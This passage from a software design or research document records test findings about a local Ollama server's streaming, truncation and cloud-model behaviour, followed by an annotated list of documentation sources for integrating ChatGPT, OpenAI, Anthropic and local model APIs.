- OpenTUI 0.6.3's `Markdown` streaming flag; `@ai-sdk/react` under OpenTUI; SIWC through the AI SDK's OpenAI provider.
- Browser shortcut clashes for a toggle key.
- Not researched: Anthropic or Google consumer subscriptions for third-party apps, Gemini's data policy.

### E5. Resolved by Phase 0 (2026-10-21)

Recorded on a live Ollama 0.40.4 and in its v0.40.4 source; the evidence and fixtures are described in
[`ai-helper-plan.md`](ai-helper-plan.md#results-2026-10-21-ollama-0404-macos-node-2421-next-1640). This settles the
Ollama items listed in E4 above and in the Scope section:

- **The final streamed object does carry `prompt_eval_count` and `eval_count`** (and `prompt_eval_cached_count`,
  `done_reason`, durations). `prompt_eval_count` includes cached tokens.
- **Silent truncation is real**: a prompt far larger than `num_ctx` is answered with HTTP 200, no error, and a
  `prompt_eval_count` equal to the few tokens that were kept.
- **A closed connection stops generation** on the server.
- **Cloud models**: from source, a `:cloud` name (or a `-cloud` tag suffix) is forwarded to ollama.com by the chat
  handler whether or not it is listed; a local stub with `remote_host` is forwarded if that host is in
  `OLLAMA_REMOTES` (default `ollama.com`). Not tested live: this server had no cloud model.
- **`/api/tags` lists embedding models** that cannot chat; `/api/show` `capabilities` tells them apart.
- **Next 16.4.0 `next start`** streams a route handler's NDJSON response without buffering or compressing it, and
  aborts `request.signal` when the client disconnects.
- **Opengrep** flags only a literal `fetch("http://127.0.0.1…")`.

Still open: the other items in E4 (OpenAI pages, other local servers, CORS and Local Network Access questions) are
unchanged; none of them blocks the Ollama-only first version.

## Sources

All fetched or queried on 2026-10-21 unless marked otherwise. Entries marked **not fetched** returned HTTP 403 to
automated fetches; claims resting on them come from a search-engine excerpt and are unverified. Most web pages were read
through a fetch tool that summarises, so a short quoted fragment from them is as that tool returned it and may differ
slightly from the live wording. Read as raw text: the Next.js, Anthropic and react-markdown pages, the llama.cpp README,
the Ollama, `openai-node`, `anthropic-sdk-typescript` and `vercel/ai` sources, and the DevKit `LICENSE`.

**ChatGPT access (OpenAI)**

1. OpenAI, [Sign in with ChatGPT: Quickstart](https://developers.openai.com/siwc/quickstart): paths, eligibility, "limited trial", plan usage "open to all open-source partners".
2. OpenAI, [ChatGPT plan usage in your open-source app (overview)](https://developers.openai.com/siwc/token-sharing-open-source): scope "open-source and locally hosted apps", interest form for paid or remote.
3. OpenAI, [Registration and sign-in](https://developers.openai.com/siwc/token-sharing-open-source/sign-in): endpoints, scopes, PKCE, loopback rules, token storage.
4. OpenAI, [Models and inference](https://developers.openai.com/siwc/token-sharing-open-source/models-and-inference): `/v1/responses`, `/v1/models` shape, stream errors.
5. OpenAI, [Preview limitations](https://developers.openai.com/siwc/token-sharing-open-source/preview-limitations): `store`/`stream` rules, unsupported fields and tools.
6. OpenAI, [Errors and recovery](https://developers.openai.com/siwc/token-sharing-open-source/errors-and-recovery): `subscription_sharing_*` codes, refresh errors.
7. OpenAI, [Accounts and sessions](https://developers.openai.com/siwc/token-sharing-open-source/profiles-and-sessions): profiles, logout and revoke, credential storage.
8. OpenAI, [Token reference](https://developers.openai.com/siwc/token-sharing-open-source/token-reference): one-hour access tokens, 30-day rotating refresh tokens.
9. OpenAI, [Self-hosted VMs](https://developers.openai.com/siwc/token-sharing-open-source/self-hosted-vms): remote use by copied credentials; attribution and revocation "not yet available".
10. OpenAI, [Codex app-server](https://developers.openai.com/siwc/token-sharing-open-source/codex-app-server): the child-process alternative.
11. OpenAI, [UI/UX guidelines](https://developers.openai.com/siwc/ui-ux-guidelines): "Using ChatGPT plan", Manage usage, limits.
12. OpenAI, [Request a client ID](https://developers.openai.com/siwc/request-client-id): "currently offered to a select group of commercial partners".
13. OpenAI Cookbook, [Integrating Sign in with ChatGPT in your Opensource App](https://developers.openai.com/cookbook/articles/sign-in-with-chatgpt): Electron example, availability, storage, DevKit pointer.
14. [`openai/sign-in-with-chatgpt-devkit`](https://github.com/openai/sign-in-with-chatgpt-devkit): README, `LICENSE` ("Sign-in with ChatGPT DevKit Noncommercial License v1.0"), repo created 2026-09-29; `@siwc/*` absent from the npm registry (HTTP 404).
15. OpenAI, [Codex authentication](https://developers.openai.com/codex/auth) (308 redirect to `https://learn.chatgpt.com/docs/auth`, which I read): ChatGPT versus API-key sign-in, billing, credential cache.
16. [`openai/codex` Discussion #8338](https://github.com/openai/codex/discussions/8338): maintainer replies of 2025-12-19 and 2026-02-09; later questions unanswered.
17. OpenAI Help Center, [Using your ChatGPT plan in other apps and sites](https://help.openai.com/en/articles/20001542-using-your-chatgpt-plan-in-other-apps-and-sites): **not fetched**; search excerpt only (says Go, Plus or Pro).
18. OpenAI, [Sign in with ChatGPT Terms](https://openai.com/policies/sign-in-with-chatgpt-terms/): **not fetched**; search excerpt only.
19. OpenAI, [Terms of Use](https://openai.com/policies/row-terms-of-use/): **not fetched**; search excerpt only (programmatic extraction of Output).
20. OpenAI, [Apps SDK / plugins docs](https://developers.openai.com/apps-sdk): MCP servers that connect external systems into ChatGPT and Codex; the page no longer uses the name "Apps SDK" in the text I read.

**OpenAI API**

21. OpenAI, [Migrate to the Responses API](https://developers.openai.com/api/docs/guides/migrate-to-responses): recommendation, `store` defaults.
22. OpenAI, [Streaming API responses](https://developers.openai.com/api/docs/guides/streaming-responses): SSE event types.
23. OpenAI, [Chat Completions streaming events](https://developers.openai.com/api/reference/resources/chat/subresources/completions/streaming-events): chunk shape, usage chunk.
24. OpenAI, [List models](https://developers.openai.com/api/reference/resources/models/methods/list).
25. OpenAI, [Error codes](https://developers.openai.com/api/docs/guides/error-codes).
26. OpenAI, [Rate limits](https://developers.openai.com/api/docs/guides/rate-limits).
27. OpenAI, [Data controls](https://developers.openai.com/api/docs/guides/your-data): training, 30-day logs, ZDR.
28. OpenAI, [API reference overview](https://developers.openai.com/api/reference/overview): bearer auth, client-side warning, `x-request-id`.
29. OpenAI, [Models](https://developers.openai.com/api/docs/models): flagship models, context windows, prices.
30. OpenAI, [Token counting](https://developers.openai.com/api/docs/guides/token-counting).
31. [`openai/openai-node`](https://github.com/openai/openai-node) README (`dangerouslyAllowBrowser`) and `src/core/streaming.ts` (`[DONE]`), at commit `e352050`.

**Local and self-hosted models**

32. Ollama, [API introduction](https://docs.ollama.com/api/introduction): base URLs, port 11434.
33. Ollama, [OpenAI compatibility](https://docs.ollama.com/api/openai-compatibility): endpoints, unsupported fields, key "required but ignored", no context setting.
34. Ollama, [FAQ](https://docs.ollama.com/faq): `OLLAMA_ORIGINS`, `OLLAMA_HOST`, default context 4096, keep-alive; re-read 2026-10-21 for the Nginx example, no documented auth, and the cloud-features answers (`OLLAMA_NO_CLOUD`, `disable_ollama_cloud`).
35. Ollama, [Streaming](https://docs.ollama.com/api/streaming): NDJSON, default on.
36. Ollama, [Chat API](https://docs.ollama.com/api/chat): `options.num_ctx`, response fields.
37. Ollama, [Context length](https://docs.ollama.com/context-length): VRAM tiers.
38. [`ollama/ollama`](https://github.com/ollama/ollama) source at commit `8cc68d2` (v0.40.7 released 2026-10-18): `envconfig/config.go` (`AllowedOrigins`), `server/routes.go` (CORS, `allowedHostsMiddleware`, routes, 404 text), `server/prompt.go` (`chatPrompt`).
39. LM Studio, [OpenAI compatibility](https://lmstudio.ai/docs/developer/openai-compat).
40. LM Studio, [Server settings](https://lmstudio.ai/docs/developer/core/server/settings): Enable CORS, serve on local network, JIT loading.
41. LM Studio, [Authentication](https://lmstudio.ai/docs/developer/core/authentication).
42. [`ggml-org/llama.cpp`](https://github.com/ggml-org/llama.cpp): `tools/server/README.md` and `common/common.h` at commit `7775ffb`.
43. vLLM, [`vllm serve` reference](https://docs.vllm.ai/en/latest/cli/serve/): port 8000, CORS defaults.
44. vLLM, [Online serving](https://docs.vllm.ai/en/latest/serving/online_serving/): endpoints, chat template requirement.

**Other hosted providers**

45. Anthropic, [API overview](https://platform.claude.com/docs/en/api/overview): headers, endpoints, request limits.
46. Anthropic, [OpenAI SDK compatibility](https://platform.claude.com/docs/en/cli-sdks-libraries/libraries/openai-sdk): limits and "not ... production-ready".
47. Anthropic, [Streaming messages](https://platform.claude.com/docs/en/build-with-claude/streaming): SSE event flow, errors.
48. Anthropic, [API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention): training, retention, Covered Models, CORS under ZDR.
49. [`anthropics/anthropic-sdk-typescript`](https://github.com/anthropics/anthropic-sdk-typescript): README and `src/client.ts` (`dangerouslyAllowBrowser`, `anthropic-dangerous-direct-browser-access`) at commit `5d489aa`.
50. Anthropic, [Models overview](https://platform.claude.com/docs/en/about-claude/models/overview).
51. Google, [Gemini API: OpenAI compatibility](https://ai.google.dev/gemini-api/docs/openai).
52. OpenRouter, [API overview](https://openrouter.ai/docs/api-reference/overview).

**Libraries**

53. npm registry metadata for `ai`, `@ai-sdk/react`, `@ai-sdk/openai-compatible`, `openai`, `@anthropic-ai/sdk` (`https://registry.npmjs.org/<name>/latest`): version, license, `unpackedSize`, peers, engines, publish times.
54. Vercel, [AI SDK: Transport](https://ai-sdk.dev/docs/ai-sdk-ui/transport).
55. Vercel, [AI SDK: Chatbot / `useChat`](https://ai-sdk.dev/docs/ai-sdk-ui/chatbot).
56. Vercel, [AI SDK: OpenAI-compatible providers](https://ai-sdk.dev/providers/openai-compatible-providers).
57. [`vercel/ai`](https://github.com/vercel/ai) `packages/ai/src/ui/chat-transport.ts` and `LICENSE` (Apache-2.0) at commit `d0063af`.
58. [`remarkjs/react-markdown`](https://github.com/remarkjs/react-markdown) readme at commit `f9ca66e`: "secure by default", `defaultUrlTransform`, raw HTML, `rehype-sanitize`.
59. GitHub metadata: [`atom/node-keytar`](https://github.com/atom/node-keytar) (archived), [`Brooooooklyn/keyring-node`](https://github.com/Brooooooklyn/keyring-node) (`@napi-rs/keyring`, maintained, MIT).

**Platform and standards**

60. Next.js, [Static exports](https://nextjs.org/docs/app/guides/static-exports) (updated 2026-08-09): unsupported features.
61. Next.js, [Server Actions and Mutations](https://nextjs.org/docs/app/guides/server-actions) (updated 2026-10-15): sequential dispatch, CSRF check.
62. Next.js, [`route.js`](https://nextjs.org/docs/app/api-reference/file-conventions/route) (updated 2026-04-30): streaming responses, CORS. (The same docs ship with the installed `next` package at `node_modules/next/dist/docs/`, which I also read.)
63. Electron, [`safeStorage`](https://www.electronjs.org/docs/latest/api/safe-storage).
64. Electron, [`net`](https://www.electronjs.org/docs/latest/api/net): `net.fetch` versus Node `fetch`.
65. Electron, [Security](https://www.electronjs.org/docs/latest/tutorial/security): validate IPC senders, no raw IPC in preload.
66. Electron, [Inter-process communication](https://www.electronjs.org/docs/latest/tutorial/ipc): main-to-renderer pattern and the `event.sender` leak.
67. MDN, [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS): preflight triggers.
68. MDN, [Mixed content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content).
69. W3C, [Mixed Content](https://www.w3.org/TR/mixed-content/) (Candidate Recommendation Draft, 2023-02-23).
70. Chrome for Developers, [Local Network Access](https://developer.chrome.com/blog/local-network-access).
71. MDN, [`log` role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Roles/log_role).
72. MDN, [ARIA live regions](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Guides/Live_regions).
73. MDN, [`aria-busy`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Attributes/aria-busy).
74. OWASP GenAI, [LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/).
75. OWASP GenAI, [LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/).
76. OWASP, [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

77. Ollama, [List models](https://docs.ollama.com/api/tags): `GET /api/tags`, `ModelSummary` with `remote_model` and `remote_host` (fetched 2026-10-21).
78. Ollama, [Cloud](https://docs.ollama.com/cloud): `:cloud` model names, `ollama.com` API with a bearer key or a signed-in app (fetched 2026-10-21).
79. [`ollama/ollama` `docs/api.md`](https://github.com/ollama/ollama/blob/main/docs/api.md), "Show Model Information": `POST /api/show`, `model_info`, `capabilities` (fetched via raw.githubusercontent.com on 2026-10-21; `docs.ollama.com/api/show` returned 404).

**Repo evidence** is cited inline by path and line. The opengrep results in section D are my own run of the repo's pinned
rules (`.opengrep-rules`, commit `f1d2b56`) on synthetic snippets, not an external source.

**Not retrievable:** `openai.com` policy pages and `help.openai.com` (see [17] to [19]). The OpenAI error for an oversized
prompt and the other gaps listed in [E4](#e4-not-resolved-here) were not found in the pages I read.
